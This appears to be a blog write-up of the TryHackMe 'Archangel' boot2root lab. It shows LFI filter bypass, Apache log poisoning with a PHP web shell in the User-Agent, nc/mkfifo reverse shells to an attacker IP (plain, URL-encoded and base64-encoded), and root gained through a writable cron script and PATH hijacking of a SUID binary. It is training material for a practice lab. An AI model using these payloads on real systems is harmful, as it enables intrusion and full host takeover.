---
layout: writeup
type: writeup
image: images/writeups/thm/archangel/logo.jpeg
title: Archangel - TryHackMe
permalink: writeups/archangel
# All dates must be YYYY-MM-DD format!
date: 2021-03-22
labels:
  - TryHackMe
  - boot2root
  - Easy
  - LFI
  - Web Exploitation
  - Privilege Escalation
summary: Boot2root, Web exploitation, Privilege escalation, LFI
---

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/archangel/header.png">
<script src="https://www.tryhackme.com/badge/192700"></script>

```
MACHINE = ARCHANGEL
TARGET = VARIABLE
OS = LINUX
DIFFICULTY = EASY
```
## Enumeration

Starting with an nmap scan

```bash
~/Doc/tryhackme/archangel ❯ sudo nmap -sS -sV -T5 -A 10.10.129.158 | tee nmap-init
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 20:02 WAT
Nmap scan report for 10.10.129.158
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   172.84 ms 10.9.0.1
2   172.62 ms 10.10.129.158

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.96 seconds
```

I started by enumerating the website with curl just to get a look at it and I spotted an email address that gave the domain name.

```bash
~/Documents/tryhackme/archangel ❯ curl http://10.10.129.158
<!DOCTYPE html>
<!--
Template Name: Wavefire
Author: <a href="https://www.os-templates.com/">OS Templates</a>
Author URI: https://www.os-templates.com/
Copyright: OS-Templates.com
Licence: Free to use under our free template licence terms
Licence URI: https://www.os-templates.com/template-terms
-->
<html lang="">
<!-- To declare your language - read more here: https://www.w3.org/International/questions/qa-html-language-declarations -->
<head>
<title>Wavefire</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<link href="layout/styles/layout.css" rel="stylesheet" type="text/css" media="all">
</head>
<body id="top">
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<!-- ################################################################################################ -->
<div class="wrapper row0">
  <header id="header" class="hoc clear">
    <!-- ################################################################################################ -->
    <div id="logo" class="one_quarter first">
      <h1><a href="index.html"><span>w</span>ave<span>f</span>ire</a></h1>
    </div>
    <div class="three_quarter">
      <ul class="nospace clear">
        <li class="one_third first">
          <div class="block clear"><a href="#"><i class="fas fa-phone"></i></a> <span><strong>Give us a call:</strong> +xx (xxx) xxxx</span></div>
        </li>
        <li class="one_third">
          <div class="block clear"><a href="#"><i class="fas fa-envelope"></i></a> <span><strong>Send us a mail:</strong> support@mafialive.thm</span></div>
...split...
```

I added the new domain to my /etc/hosts file and used curl on it. It gave the first flag, nice.

```bash
~/Documents/tryhackme/archangel ❯ cat /etc/hosts
# This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:
# [network]
# generateHosts = false
127.0.0.1       localhost
127.0.1.1       Toyin.localdomain       Toyin
10.10.129.158   mafialive.thm

192.168.1.100   host.docker.internal
192.168.1.100   gateway.docker.internal
127.0.0.1       kubernetes.docker.internal

~/Documents/tryhackme/archangel ❯ curl mafialive.thm
<h1>UNDER DEVELOPMENT</h1>

thm{XXXXXXXXXX}

```

I started a gobuster scan to get hidden directories and i got rick rolled while being lured by a flag
I then start a gobuster scan on the new domain

```bash
~/Documents/tryhackme/archangel ❯ sudo gobuster dir -u http://mafialive.thm -w /usr/share/wordlists/dirb/common.txt
 -o gobuster-scan-mafialive-common -x php,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://mafialive.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2021/02/04 20:25:15 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/test.php (Status: 200)
===============================================================
2021/02/04 20:29:34 Finished
===============================================================
```

I then checked the robots.txt and found a disallowed page and I used curl on the page

```bash
~/Documents/tryhackme/archangel ❯ curl mafialive.thm/robots.txt
User-agent: *
Disallow: /test.php
~/Documents/tryhackme/archangel ❯ curl mafialive.thm/test.php

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
            </div>
</body>

</html>
```

## Exploitation

Looking at the page i immediately realised that the page was vulnerable to local file inclusion and i decided to exploit it a bit
I tried typical LFI techniques but it seemed like there was a filter so I got the code for test.php to find how to bypass it. Doing that gave another flag.

```bash
~/Documents/tryhackme/archangel ❯ curl mafialive.thm/test.php\?view=/var/www/html/development_testing/mrrobot.php
...long output...

~/Documents/tryhackme/archangel ❯ echo CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== | base64 -d | tee test.php

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

            //FLAG: thm{XXXXXXXXXX}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>
    </div>
</body>

</html>
```

It used a pretty simmple filter to bypass by replacing "../.." with "..//.."
Using the command below to get the base64 encoded /etc/passwd file. I got a user named archangel
```bash
curl mafialive.thm/test.php\?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//etc/passwd
```

I decided to get a shell by doing some remote code execution
I chose to go the route of apache log poisoning but there are a bunch of ways to get this done
I used burp suite also

```bash
#payload for reverseshell from webshell
GET /test.php/?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&c=whoami HTTP/1.1
Host: mafialive.thm
User-Agent: mozilla <?php system($_GET['c']);?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

I url encoded a nc reverse shell with burp suite and passed that as a parameter

```bash
#reverse shell command
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.169.84 4444 >/tmp/f

#encoded
%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%39%2e%31%36%39%2e%38%34%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66

#started a netcat listener
~/Documents/tryhackme/archangel ❯ nc -lnvp 4444
Listening on 0.0.0.0 4444

#burp payload
GET /test.php/?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&c=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%39%2e%31%36%39%2e%38%34%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66 HTTP/1.1
Host: mafialive.thm
User-Agent: mozilla <?php system($_GET['c']);?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

#received a shell
~/Documents/tryhackme/archangel ❯ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.129.158 34562
/bin/sh: 0: can't access tty; job control turned off
$ whoami; hostname; uname -a; w; id
www-data
ubuntu
Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:53:00 up  1:21,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

I found a cron job being executed by archangel and user www-data has full access to it
I modified the file to get a reverse shell as archangel
After a couple of seconds I got a shell as archangel

```bash
www-data@ubuntu:/tmp$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
www-data@ubuntu:/tmp$ ls -lsa /opt/helloworld.sh
ls -lsa /opt/helloworld.sh
4 -rwxrwxrwx 1 archangel archangel 66 Nov 20 10:35 /opt/helloworld.sh
www-data@ubuntu:/tmp$ cat /opt/helloworld.sh
cat /opt/helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt

www-data@ubuntu:/tmp$ echo IyEvYmluL2Jhc2gKcm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuOS4xNjkuODQgNTU1NSA+L3RtcC9m | base64 -d > /opt/helloworld.sh
<QgNTU1NSA+L3RtcC9m | base64 -d > /opt/helloworld.sh
www-data@ubuntu:/tmp$ cat /opt/helloworld.sh
cat /opt/helloworld.sh
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.169.84 5555 >/tmp/f
```

Looking for files with the SUID bit set I found a file in my user's home directory

```bash
~/Documents/tryhackme/archangel ❯ nc -lnvp 5555                                                                  
Listening on 0.0.0.0 5555
Connection received on 10.10.129.158 49082
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty; pty.spawn('/bin/bash')"
archangel@ubuntu:~$
archangel@ubuntu:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/gpasswd
...snip...
/bin/ping
/home/archangel/secret/backup
archangel@ubuntu:~$ ls -lsa /home/archangel/secret/backup
ls -lsa /home/archangel/secret/backup
20 -rwsr-xr-x 1 root root 16904 Nov 18 16:40 /home/archangel/secret/backup
archangel@ubuntu:~$ file /home/archangel/secret/backup
file /home/archangel/secret/backup
/home/archangel/secret/backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f957efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped
```

After realising the file "backup" was a binary file, i did the strings command on it to find some hidden info and that gave me the idea to exploit a binary that was being called by the program without full path

```bash
#analysing the file and exploiting it
archangel@ubuntu:~/secret$ strings backup
...snip...
cp /home/user/archangel/myfiles/* /opt/backupfiles
...snip...

archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:$PATH
export PATH=/home/archangel/secret:$PATH
archangel@ubuntu:~/secret$ echo $PATH
/home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
archangel@ubuntu:~/secret$ echo IyEvYmluL2Jhc2gKcm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuOS4xNjkuODQgNjY2NiA+L3RtcC9m | base64 -d > cp
archangel@ubuntu:~/secret$ ls -lsa
total 56
 4 drwxrwx--- 2 archangel archangel  4096 Feb  5 02:20 .
 4 drwxr-xr-x 6 archangel archangel  4096 Nov 20 15:22 ..
20 -rwsr-xr-x 1 root      root      16904 Nov 18 16:40 backup
20 -rwxr-xr-x 1 archangel archangel 16904 Feb  5 02:18 backup2
 4 -rw-rw-r-- 1 archangel archangel    90 Feb  5 02:20 cp
 4 -rw-r--r-- 1 root      root         49 Nov 19 20:41 user2.txt
archangel@ubuntu:~/secret$ chmod +x cp
archangel@ubuntu:~/secret$ ./backup

#i got a reverse shell as root
~/Documents/tryhackme/archangel ❯ nc -lnvp 6666
Listening on 0.0.0.0 6666
Connection received on 10.10.129.158 46466
# whoami
root
```

pwned